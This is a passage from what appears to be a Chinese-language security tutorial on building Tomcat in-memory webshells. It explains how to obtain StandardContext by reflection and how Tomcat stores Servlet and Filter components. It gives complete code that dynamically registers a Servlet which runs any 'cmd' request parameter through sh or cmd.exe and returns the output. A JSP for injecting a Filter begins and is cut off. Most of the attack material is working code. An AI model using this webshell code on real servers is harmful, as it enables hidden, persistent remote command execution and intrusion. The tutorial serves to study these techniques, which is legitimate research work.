(HashMap&lt;String,Map&gt;)field.get(repository);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在jsp中要用domainTb.get(&quot;Catalina&quot;)，在SpringBoot中要用domainTb.get(&quot;Tomcat&quot;)</span></span><br><span class="line">  <span class="type">String</span> <span class="variable">keyNonLoginAuthenticator</span> <span class="operator">=</span> <span class="string">&quot;context=/,host=localhost,name=NonLoginAuthenticator,type=Valve&quot;</span>;</span><br><span class="line">  <span class="type">NamedObject</span> <span class="variable">namedObject</span> <span class="operator">=</span> (NamedObject) domainTb.get(<span class="string">&quot;Catalina&quot;</span>).get(keyNonLoginAuthenticator);</span><br><span class="line"><span class="comment">//  NamedObject namedObject = (NamedObject) domainTb.get(&quot;Tomcat&quot;).get(keyNonLoginAuthenticator);</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取object</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">object</span> <span class="operator">=</span> namedObject.getClass().getDeclaredField(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">  object.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">BaseModelMBean</span> <span class="variable">baseModelMBean</span> <span class="operator">=</span> (BaseModelMBean) object.get(namedObject);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取resource</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">resource</span> <span class="operator">=</span> baseModelMBean.getClass().getDeclaredField(<span class="string">&quot;resource&quot;</span>);</span><br><span class="line">  resource.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">NonLoginAuthenticator</span> <span class="variable">nonLoginAuthenticator</span> <span class="operator">=</span> (NonLoginAuthenticator) resource.get(baseModelMBean);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取context（注意这里的context在nonLoginAuthenticator的父类里面，而getDeclaredField是不能获取父类的属性的，因此这里需要getSuperClass()）</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> nonLoginAuthenticator.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context.get(nonLoginAuthenticator);</span><br><span class="line"></span><br><span class="line">  System.out.println(standardContext);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="方式五：通过RequestContextHolder获取"><a href="#方式五：通过RequestContextHolder获取" class="headerlink" title="方式五：通过RequestContextHolder获取"></a>方式五：通过RequestContextHolder获取</h3><blockquote><p>注意：这种方式只适用于 <code>Spring</code> 框架中。</p></blockquote><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p>在 <code>Spring</code> 中，可以通过 <code>RequestContextHolder. currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0)</code> 静态方法拿到 <code>Spring</code> 的全局 <code>context</code> ，而且这个 <code>Spring</code> 的 <code>context</code> 中封装了 <code>Tomcat</code> 的 <code>StandardContext</code> （在 <code>SpringBoot</code> 中其实是其子类 <code>TomcatEmbeddedContext</code> ）。</p><h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先获取Spring的context</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.</span><br><span class="line">currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;springContext = &quot;</span> + context);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 再获取Spring的context中封装的Tomcat的StandardContext</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> context.getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 注意当前环境中有两个ApplicationContext类，一个Spring的，一个Tomcat的，这里要用Tomcat(org.apache.catalina.core.ApplicationContext)，不要导错了</span></span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) field.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) applicationContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;standardContext = &quot;</span> + standardContext);</span><br></pre></td></tr></table></figure><h2 id="Servlet组件的存储位置"><a href="#Servlet组件的存储位置" class="headerlink" title="Servlet组件的存储位置"></a>Servlet组件的存储位置</h2><blockquote><p>通过前面文章的分析，我们现在已经可以拿到 <code>Tomcat</code> 的 <code>web</code> 应用的 <code>StandardContext</code> 这个全局控制管理关键类了。为了后面我们在程序中动态地注册 <code>Servlet</code> 组件，我们先要知道 <code>Servlet</code> 的组件存放在哪里，这样我们才能知道如何通过 <code>StandardContext</code> 来动态注册 <code>Servlet</code> 组件。这里我们在下面介绍的是 <code>Tomcat</code> 服务器中的 <code>Servlet</code> 实现，重点研究 <code>Tomcat</code> 中的内存马。不同框架的 <code>Servlet</code> 实现不同，因此其内存马的实现也不同。</p></blockquote><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>在上面 <code>Tomcat</code> 的容器组件中介绍到了，一个 <code>Servlet</code> 在 <code>Tomcat</code> 对应一个 <code>Wrapper</code> 。因此注册一个 <code>Servlet</code> 应该肯定关键在于分析 <code>Wrapper</code> 的使用。</p><h4 id="Servlet接口"><a href="#Servlet接口" class="headerlink" title="Servlet接口"></a>Servlet接口</h4><p><code>Servlet</code> 是处理 <code>http</code> 请求的一个组件，其核心处理 <code>http</code> 请求的位置在其 <code>service()</code> 函数中，因此动态注册一个 <code>Servlet</code> 就是要定义一个 <code>Servlet</code> 接口的实现类，定义其 <code>service</code> 方法。</p><p><img src="/imgs/Pasted%20image%2020230911023603.png"></p><h4 id="Wrapper接口"><a href="#Wrapper接口" class="headerlink" title="Wrapper接口"></a>Wrapper接口</h4><p>通过观察 <code>Wrapper</code> 接口中定义的方法，我们可以很容易得知这个接口的功能应该就是用于管理我们定义的 <code>Servlet</code> ，<code>Wrapper</code> 中 <strong>封装</strong> 了 <code>Servlet</code> 。</p><p>它们的功能简单点来说，<code>Servlet</code> 是关于具体如何处理 <code>http</code> 请求的；<code>Wrapper</code> 是关于处理 <code>Servlet</code> 状态，获取 <code>Servlet</code> 状态的。</p><p>打个比方，<code>Servlet</code> 就像一个运行的机器，我们要告诉它怎么运行；<code>Wrapper</code> 就像一个机器背后的监控运维程序，用于获取或设置机器状态；<code>StandardContext</code> 就像工厂的老板，管理全部，由老板（ <code>StandardContext</code> ）决定运维（ <code>Wrapper</code> ）来是否开启机器（ <code>Servlet</code> ）。</p><p><img src="/imgs/Pasted%20image%2020230911024023.png"></p><h4 id="具体如何动态注册Servlet代码"><a href="#具体如何动态注册Servlet代码" class="headerlink" title="具体如何动态注册Servlet代码"></a>具体如何动态注册Servlet代码</h4><p>动态注册 <code>Servlet</code> 比较容易，说了那么多概念，直接给出代码就懂了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> &#123;</span><br><span class="line"><span class="comment">// 在service里面定义我们想在servlet里实现的功能，这里我们就是要注入命令</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (cmd == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">isLinux = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>( in ).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> res.getWriter();</span><br><span class="line">out.println(output);</span><br><span class="line">out.flush();</span><br><span class="line">out.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随便定义一个servlet的名字</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;randomName&quot;</span>;</span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">wrapper.setName(name);</span><br><span class="line"><span class="comment">// 设置服务器一启动就调用这个Servlet的init方法，这里其实也没什么用</span></span><br><span class="line">wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">wrapper.setServlet(servlet);</span><br><span class="line">wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">standardContext.addChild(wrapper);</span><br><span class="line"><span class="comment">// 添加路由，这里第一个参数是我们定义的servlet匹配的URL路径</span></span><br><span class="line">standardContext.addServletMappingDecoded(<span class="string">&quot;/path&quot;</span>, name);</span><br></pre></td></tr></table></figure><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><h4 id="Filter接口"><a href="#Filter接口" class="headerlink" title="Filter接口"></a>Filter接口</h4><p><code>Filter</code> 接口的作用主要是为了我们定义一个 <code>Filter</code> 在运行过程中需要进行什么操作。</p><p>核心逻辑在 <code>doFilter</code> 中。</p><p><img src="/imgs/1694398726397.png"></p><p>如下是一个实现 <code>Filter</code> 的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.controller.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="comment">//1.放行前，对request数据进行处理，然后处理后的request数据会被传到后面。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;FilterDemo start&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        <span class="comment">//2.放行后，对response对象进行处理，这里的response对象是服务器传过来的。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;FilterDemo end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="FilterDef类"><a href="#FilterDef类" class="headerlink" title="FilterDef类"></a>FilterDef类</h4><p><img src="/imgs/1694399161751.png"></p><ul><li>其中 <code>filter</code> 成员变量保存 <code>Filter</code> 类的实例对象。</li><li><code>filterClass</code> 成员变量保存 <code>Filter</code> 类的实例对象的类型（类路径）。</li><li><code>filterName</code> 成员变量保存 <code>Filter</code> 类的实例对象的名称（往往和类路径是一样，但是也可以不一样）。</li></ul><p>并提供了其 <code>getter</code> ，<code>setter</code> 方法，我们创建一个 <code>Filter</code> 的时候就要创建一个 <code>FilterDef</code> 实例对象，并通过其 <code>setter</code> 方法修改其必需的 <code>Filter</code> 信息内容。**<code>FilterDef</code> 是 <code>Filter</code> 的封装** 。</p><p>定义方式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line"><span class="comment">// 封装filter实例</span></span><br><span class="line">filterDef.setFilter(filter); </span><br><span class="line"><span class="comment">// name可以取任意一个不重复的值</span></span><br><span class="line">filterDef.setFilterName(name);  </span><br><span class="line"><span class="comment">// 设置Filter的位置，以便能够找到Filter的位置（因为有的时候filterDef.filter为null，我们需要通过filterClass来动态的获取filter）</span></span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());  </span><br></pre></td></tr></table></figure><h4 id="FilterMap类"><a href="#FilterMap类" class="headerlink" title="FilterMap类"></a>FilterMap类</h4><p><img src="/imgs/1694401097240.png"></p><ul><li><p><code>filterName</code> ：保存 <code>Filter</code> 的名称，和前面 <code>FilterDef.filterName</code> 保持一致，且不与其他的 <code>Filter</code> 重复即可。</p></li><li><p><code>dispatcherMapping</code> ：用来设置 <code>Filter</code> 被 <code>Servlet</code> 调用的方式，方式包含有 <code>FORWARD</code> ，<code>INCLUDE</code> ，<code>REQUEST</code> ,  <code>ASYNC</code> ,  <code>ERROR</code> 。这里我们要写 <code>Filter</code> 内存马，那肯定我们想每次请求都需要经过 <code>Filter</code> ，因此这里需要设置为 <code>REQUEST</code> 方式，当然这里也支持同时设置为多种方式。</p><blockquote><ul><li><code>REQUEST</code> ：当用户直接访问页面时，容器将会调用过滤器。如果目标资源是通过 <code>RequestDispatcher</code> 的 <code>include()</code> 或<code> forward()</code> 方法访问，则该过滤器就不会被调用。</li><li><code>INCLUDE</code> ：如果目标资源通过 <code>RequestDispatcher</code> 的 <code>include()</code> 方法访问，则该过滤器将被调用。除此之外，该过滤器不会被调用。</li><li><code>FORWARD</code> ：如果目标资源通过 <code>RequestDispatcher</code> 的<code> forward()</code> 方法访问，则该过滤器将被调用，除此之外，该过滤器不会被调用。</li><li><code>ERROR</code> ：如果目标资源通过声明式异常处理机制访问，则该过滤器将被调用。除此之外，过滤器不会被调用。</li><li><code>ASYNC</code> ：<code>ASYNC</code> 很像是 <code>INCLUDE</code> 的升级版，<code>INCLUDE</code> 是 分配任务给另一个 <code>Servlet</code> 执行，而 <code>ASYNC</code> 则可以将任务分配给任意多个普通线程去执行。</li></ul></blockquote></li><li><p><code>urlPatterns</code> ：表示 <code>Filter</code> 匹配的路径，可以填多个。</p></li><li><p><code>matchAllUrlPattern</code> ：在 <code>urlPattern</code> 定义了多个路径时，就可以用 <code>matchAllUrlPattern</code> 来设置 <code>Filter</code> 是匹配全部 <code>URL</code> 才经过，还是匹配了一个 <code>URL</code> 就经过。</p></li></ul><p>根据上面的分析，可以知道 <code>FilterMap</code> 是用来设置 <code>Filter</code> 何时会被经过的。</p><h4 id="ContextFilterMaps类"><a href="#ContextFilterMaps类" class="headerlink" title="ContextFilterMaps类"></a>ContextFilterMaps类</h4><p><img src="/imgs/1694402711288.png"></p><p><code>ContextFilterMaps</code> 是 <code>StandardContext</code> 用来管理全局所有 <code>FilterMaps</code> 的工具内部类。</p><ul><li><code>array</code> ：存放全局的 <code>Filter</code> 。</li><li><code>insertPoint</code> ：用来在定义一个新的 <code>Filter</code> 时，把这个 <code>Filter</code> 插入到 <code>Filter</code> 链的哪个位置。默认为 <code>0</code> ，也就是放在 <code>FilterMap[]</code> 数组 <code>array</code> 的最前面。这里我们不需要管它的顺序，因为内存马只要能够执行就可以了。</li><li><code>lock</code> ：就是为了给这个类的方法来加锁的，防止多线程访问冲突。这里这个也不是很重要。</li></ul><h4 id="ApplicationFilterConfig类"><a href="#ApplicationFilterConfig类" class="headerlink" title="ApplicationFilterConfig类"></a>ApplicationFilterConfig类</h4><p>通过看这个类里面的内容，可以看出 <code>filterConfigs</code> 和 <code>filterDefs</code> 存储的内容很类似，只不过   <code>filterConfigs</code> 存的内容更多一点。<code>filterConfigs</code> 包含了 <code>filterDefs</code> 里的内容，额外多了一些 <code>log</code> ，<code>context</code> ，<code>filter</code> 属性。</p><p><img src="/imgs/Pasted%20image%2020230911165908.png"></p><h4 id="StandardContext中有关Filter的属性作用介绍"><a href="#StandardContext中有关Filter的属性作用介绍" class="headerlink" title="StandardContext中有关Filter的属性作用介绍"></a>StandardContext中有关Filter的属性作用介绍</h4><p>我们可以在 <code>StandardContext</code> 类中看到三个有关 <code>Filter</code> 的属性，下面来介绍一些这些属性的作用。</p><p><img src="/imgs/1694397018999.png"></p><ul><li><p><code>ContextFilterMaps filterMaps</code> 变量：<br>包含所有 <code>filter</code> 的 <code>url</code> 映射关系。</p></li><li><p><code>Map&lt;String, FilterDefs&gt; filterDefs</code> 变量：<br>包含所有 <code>filter</code> 包括实例内部等变量。</p></li><li><p><code>Map&lt;String, ApplicationFilterConfig&gt; filterConfigs</code> 变量：<br>包含所有与过滤器对应的 <code>filterDef</code> 信息及 <code>filter</code> 实例。</p></li></ul><p>为了更清楚的查看这些变量的作用，最直接，最简单的方式就是直接自己注册一个 <code>Filter</code> ，然后动态调试程序中的 <code>StandardContext</code> 的这些变量存放了什么内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.controller.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="comment">//1.放行前，对request数据进行处理，然后处理后的request数据会被传到后面。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;FilterDemo start&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        <span class="comment">//2.放行后，对response对象进行处理，这里的response对象是服务器传过来的。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;FilterDemo end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/1694398394736.png"></p><p><img src="/imgs/1694422949260.png"></p><p><img src="/imgs/1694422993994.png"></p><h4 id="具体如何动态注册Filter代码"><a href="#具体如何动态注册Filter代码" class="headerlink" title="具体如何动态注册Filter代码"></a>具体如何动态注册Filter代码</h4><ol><li>定义我们自己的 <code>Filter</code> 。</li><li>将我们的 <code>Filter</code> 分别封装为 <code>FilterDef</code> 和 <code>FilterMap</code> 。</li><li>将上面封装好的 <code>FilterDef</code> 和 <code>FilterMap</code> 注册到容器的 <code>standardContext</code> 中。</li><li>创建一个 <code>ApplicationFilterConfig</code> 对象，将其加入到 <code>standardContext</code> 的 <code>filterConfigs</code> 属性中。</li></ol><p>有了前面的基础，下面直接给出代码就很容易看懂了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span 